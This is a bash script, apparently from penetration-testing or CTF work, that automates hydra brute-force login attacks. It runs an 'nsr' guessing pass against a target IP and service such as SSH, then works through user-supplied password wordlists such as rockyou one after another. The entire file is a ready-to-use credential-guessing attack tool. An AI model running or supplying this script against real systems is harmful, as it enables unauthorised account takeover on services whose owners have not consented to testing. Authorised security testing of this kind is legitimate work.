#!/bin/bash

if [ $# -lt 4 ]; then
    echo "[!] Usage: hydro <service> <ip> <userlist> <all password lists go here (in run order)>"
    echo "[example]: hydro ssh 10.10.10.10 firstnames.txt cewl.txt /usr/share/seclists/Passwords/top_shortlist.txt /usr/share/wordlists/rockyou.txt"
    exit 1
fi

service=$1
targetIP=$2
userList=$3

hydraone() {
	echo
	echo "=========================="
	echo "Starting with an nsr scan"
	hydra -L "${userList}" -e nsr -u "${targetIP}" "${service}"
	echo "=========================="
	echo "nsr scan complete"
	echo
}

hydratwo() {
	echo
	echo "%%%%%%%%%%%%%%%%%%%%%%%%"
	echo "Starting passlist scans"
	for passList in "${@}";do
		justList=$(echo "${passList}"|rev |cut -d"/" -f1|rev)
		echo
		echo "=========================="
		echo "starting hydra with the ${justList} password list."
		hydra -L "${userList}" -P "${passList}" -u "${targetIP}" "${service}"
		echo "=========================="
		echo "${justList} scan complete"
		echo
	done
	echo
	echo "################################"
	echo "all hydra scans complete"
}

hydraone
hydratwo "${@:4}"